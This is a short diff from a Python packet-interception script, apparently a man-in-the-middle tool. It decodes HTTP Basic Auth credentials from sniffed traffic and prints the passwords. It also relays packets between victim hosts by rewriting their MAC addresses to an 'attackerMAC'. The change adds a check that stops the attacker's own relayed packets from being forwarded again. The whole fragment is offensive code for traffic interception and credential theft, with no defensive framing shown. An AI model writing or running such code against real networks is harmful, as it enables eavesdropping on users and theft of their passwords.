@@ -88,7 +88,7 @@ def interceptor(packet):
             _, passw = b64decode(auth.split(None, 1)[1]).decode('utf-8').split(':', 1)
             print("*basicauth:", passw)
 
-        if ip_src in valid_ips_to_mac and ip_dst in valid_ips_to_mac:
+        if ip_src in valid_ips_to_mac and ip_dst in valid_ips_to_mac and packet[Ether].src != attackerMAC:
             packet[Ether].src = attackerMAC
             packet[Ether].dst = valid_ips_to_mac[ip_dst]
             del packet.chksum
